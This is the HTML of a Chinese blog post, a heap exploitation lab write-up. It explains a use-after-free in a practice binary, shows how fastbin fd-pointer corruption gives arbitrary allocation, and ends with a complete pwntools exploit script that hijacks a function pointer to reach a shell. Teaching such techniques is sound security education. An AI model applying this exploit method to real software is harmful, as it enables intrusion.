@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="分析本次的实验代码运行起来和上次的基本一致，打开ida进行分析，先看addnode函数：  本次的堆块大小为0x30，而字符串长度不超过32，即0x20，我们试着连续分配几个块：  上图中我们连续分配了三个块，可以看到它们每块占用的地址都是40，为了更清楚地看到堆内每块的结构，我们输入一些字符：  这里是填充之后的一个堆块，开头的绿色是prev指针，之后的黄色框是整个块的size，为0x40，之所">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="19-堆溢出2">
+<meta property="og:url" content="http://yoursite.com/2021/09/13/19-堆溢出2/index.html">
+<meta property="og:site_name" content="Jameci&#39;s Blog">
+<meta property="og:description" content="分析本次的实验代码运行起来和上次的基本一致，打开ida进行分析，先看addnode函数：  本次的堆块大小为0x30，而字符串长度不超过32，即0x20，我们试着连续分配几个块：  上图中我们连续分配了三个块，可以看到它们每块占用的地址都是40，为了更清楚地看到堆内每块的结构，我们输入一些字符：  这里是填充之后的一个堆块，开头的绿色是prev指针，之后的黄色框是整个块的size，为0x40，之所">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/19-堆溢出2/0.png">
+<meta property="og:image" content="http://yoursite.com/images/19-堆溢出2/1.png">
+<meta property="og:image" content="http://yoursite.com/images/19-堆溢出2/2.png">
+<meta property="og:image" content="http://yoursite.com/images/19-堆溢出2/3.png">
+<meta property="og:image" content="http://yoursite.com/images/19-堆溢出2/4.png">
+<meta property="og:image" content="http://yoursite.com/images/19-堆溢出2/5.png">
+<meta property="og:updated_time" content="2021-09-13T02:33:12.521Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="19-堆溢出2">
+<meta name="twitter:description" content="分析本次的实验代码运行起来和上次的基本一致，打开ida进行分析，先看addnode函数：  本次的堆块大小为0x30，而字符串长度不超过32，即0x20，我们试着连续分配几个块：  上图中我们连续分配了三个块，可以看到它们每块占用的地址都是40，为了更清楚地看到堆内每块的结构，我们输入一些字符：  这里是填充之后的一个堆块，开头的绿色是prev指针，之后的黄色框是整个块的size，为0x40，之所">
+<meta name="twitter:image" content="http://yoursite.com/images/19-堆溢出2/0.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/09/13/19-堆溢出2/">
+
+
+
+
+
+  <title>19-堆溢出2 | Jameci's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jameci's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">天下雷行，物与无妄。先王以茂对时，育万物。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/09/13/19-堆溢出2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jameci">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jameci's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">19-堆溢出2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-13T08:04:23+08:00">
+                2021-09-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>本次的实验代码运行起来和上次的基本一致，打开ida进行分析，先看addnode函数：</p>
+<p><img src="/images/19-堆溢出2/0.png" alt></p>
+<p>本次的堆块大小为0x30，而字符串长度不超过32，即0x20，我们试着连续分配几个块：</p>
+<p><img src="/images/19-堆溢出2/1.png" alt></p>
+<p>上图中我们连续分配了三个块，可以看到它们每块占用的地址都是40，为了更清楚地看到堆内每块的结构，我们输入一些字符：</p>
+<p><img src="/images/19-堆溢出2/2.png" alt></p>
+<p>这里是填充之后的一个堆块，开头的绿色是prev指针，之后的黄色框是整个块的size，为0x40，之所以是0x41，是因为末三位有标记位不是0</p>
+<p>红色框的0x20个字节是我们输入的部分，后面的浅蓝色和深蓝色框分别是addnode中设定的size值和deleall函数指针</p>
+<p>显然，由于输入字符长度限制，直接覆盖已经无法覆盖到了，我们继续分析其它函数，找到deletenode</p>
+<p><img src="/images/19-堆溢出2/3.png" alt></p>
+<p>这里有一个明显的漏洞：a[v1]被free掉之后没有赋null，这样做，尽管free掉了相应的堆块，a[v1]这个指针仍然指向了这块地址</p>
+<h1 id="FUA"><a href="#FUA" class="headerlink" title="FUA"></a>FUA</h1><p>我们知道，被free掉的堆块会进入一系列称之为bin的数据结构中，它们组成空闲堆块链表以待后续再分配，为了形成链表，堆块内部就会出现fd和bk指针，分别指向上一个空闲堆块和下一个空闲堆块，我们实际操作一下，只关注fd指针：</p>
+<p><img src="/images/19-堆溢出2/4.png" alt></p>
+<p>我们按照从前到后的顺序来free掉之前申请的块，发现最先释放的块fd指针为0，之后的每一块都指向前一块地址+0x10的位置，构成链表，为什么不直接指向前一块的地址呢？因为每个堆块最开始都是0x10字节的prev和size字段，前一块地址+0x10才是我们malloc返回的位置</p>
+<p>那么，我们尝试再申请三个块，这时就会发现，我们先会申请到最后释放的块，也就是第三块，然后再是第二块，最后才会申请到第一块</p>
+<p>我们可以试着用不同的顺序来申请和释放内存，观察会发生什么</p>
+<p>那么，什么是FUA呢？FUA指的就是我们在某一块堆块被free掉之后再向其中写入内容。被free掉的堆块如何再写入内容呢？这个题就给了我们很好的例子：它free掉指针却没有给指针赋值为null，我们依然可以使用这个指针向其中写入内容，进而破坏本来的fd指针值</p>
+<p>这么说可能会难以理解，我们举例子来说明：假设我们按顺序free掉了0，1，2这三块，那么fd指针构成的链表就会是：2 -&gt; 1 -&gt; 0 -&gt; NULL。这时候，我们调用writenode函数，向已经被释放掉的块2中写入44444444，由于fd指针就在块的最开头这一位置，所以刚好就能把fd覆盖为44444444，这时候，链表变为：2 -&gt; 44444444，我们连续分配两个块，第一块就能得到原来的2，第二块就可以在内存为44444444处开辟空间</p>
+<p>换句话说，我们使用这种方式，就能把内存中的任意位置当成堆块，进而对内存的任意位置进行读写</p>
+<h1 id="劫持"><a href="#劫持" class="headerlink" title="劫持"></a>劫持</h1><p>知道了FUA，劫持的思路也就水到渠成了</p>
+<p>我们最终要把某一个块的deleall函数指针覆盖为sys函数地址，所以，我们需要：</p>
+<p>1.申请块1，起始地址为a，deleall函数指针在a + 0x30处</p>
+<p>2.申请块2，注意块2要与块1重叠，起始地址可以是a + 0x10或a + 0x20，总之能够写入到a + 0x30即可</p>
+<p>这样，我们必须把块申请到地址可控的位置，不能放在堆栈上，因为运行时我们是不知道堆栈的地址的，数据段就成为了我们的首选位置</p>
+<p>本实验中，我选了位置0x602060</p>
+<p>为了申请上面的两个块，我们需要：</p>
+<p>1.申请两个块，这两个块分别会被放入a[0]，a[1]，</p>
+<p>2.释放，注意释放顺序一定是先释放a[0]，再释放a[1]</p>
+<p>3.修改a[1]的fd指针，让本来指向a[0]的指针指向0x602060</p>
+<p>4.连续两次addnode，这时a[1]指向的块就会被赋予a[2]，a[3]就是0x602060</p>
+<blockquote>
+<p>感觉只释放一个块然后写入修改其fd指针的话应该也能做到，但似乎有某种机制导致只释放一个块就只能从bin里拿出一个块，所以这里要释放两个，以便于拿出两个</p>
+</blockquote>
+<p>5.重复上述2，3，4，4的时候改用地址0x602070，这时a[5]就是0x602070</p>
+<p>6.向a[5]中写入24个填充字符 + sys地址，覆盖a[3]的deleall函数</p>
+<p>7.查看a[3]，即调用looknode(3)</p>
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">chunk_addr = <span class="number">0x602060</span></span><br><span class="line">sys_addr = <span class="number">0x4009c7</span></span><br><span class="line"></span><br><span class="line">conn = process(<span class="string">'./experiment2'</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">'1'</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">'120'</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">'1'</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">'120'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'4'</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'0'</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'4'</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(p64(chunk_addr + i * <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'120'</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">'120'</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">'2'</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">'5'</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">b'a'</span> * <span class="number">24</span> + p64(sys_addr))</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">'3'</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="/images/19-堆溢出2/5.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/09/12/21-9-12/" rel="next" title="21/9/12">
+                <i class="fa fa-chevron-left"></i> 21/9/12
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/09/13/20-堆溢出3/" rel="prev" title="20-堆溢出3">
+                20-堆溢出3 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Jameci</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">258</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FUA"><span class="nav-number">2.</span> <span class="nav-text">FUA</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#劫持"><span class="nav-number">3.</span> <span class="nav-text">劫持</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脚本"><span class="nav-number">4.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结果"><span class="nav-number">5.</span> <span class="nav-text">结果</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jameci</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
